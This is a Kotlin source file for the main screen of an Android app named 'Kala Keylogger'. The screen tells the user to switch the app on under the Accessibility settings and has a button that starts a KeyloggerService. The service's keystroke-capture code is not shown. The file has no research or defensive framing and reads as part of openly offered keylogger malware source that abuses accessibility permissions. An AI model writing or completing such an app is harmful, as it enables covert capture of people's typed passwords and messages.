
package com.example.kalakeylogger

import android.content.Intent
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.*
import androidx.compose.material3.Button
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp


class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            MainScreen()
        }
    }

    @Composable
    fun MainScreen() {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(16.dp),
            verticalArrangement = Arrangement.Center,
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Text(
                text = "Kala Keylogger \n auto mated \n service Go to Settings > Accessibility.\n" +
                        "Find your app under installed services.\n" +
                        "Toggle it on.",
                fontSize = 24.sp,
                modifier = Modifier.padding(bottom = 32.dp)
            )
            Button(
                onClick = { startKeyloggerService() },
                modifier = Modifier.padding(vertical = 8.dp)
            ) {
                Text(text = "Start Keylogger Service")
            }
        }
    }

    private fun startKeyloggerService() {
        // Start the Keylogger Accessibility Service
        val serviceIntent = Intent(this, KeyloggerService::class.java)
        startService(serviceIntent)
    }
}
